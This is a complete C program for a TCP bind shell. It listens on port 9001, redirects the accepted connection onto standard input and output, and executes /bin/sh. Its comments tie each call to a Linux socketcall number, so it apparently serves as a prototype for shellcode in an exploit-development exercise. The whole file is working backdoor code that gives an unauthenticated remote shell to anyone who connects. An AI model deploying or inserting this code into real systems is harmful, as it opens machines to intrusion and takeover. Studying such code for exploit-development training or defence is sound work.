#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
  int sockfd, acceptfd;
  int port = 9001;

  // Server Adress struct
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = INADDR_ANY;

  // 1) Socket Creation (sys_socket 1)
  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  // 2) Bind() Syscall (sys_bind 2)
  bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

  // 3) Listen() Syscall (sys_listen 4)
  listen(sockfd, 0);

  // 4) Accept() Syscall (sys_accept 5)
  acceptfd = accept(sockfd, NULL, NULL);

  // 5) Dup2() Syscall
  dup2(acceptfd, 0); // stdin
  dup2(acceptfd, 1); // stdout
  dup2(acceptfd, 2); // stderr

  // 6) Execve() Syscall
  execve("/bin/sh", NULL, NULL);
  return 0;
}









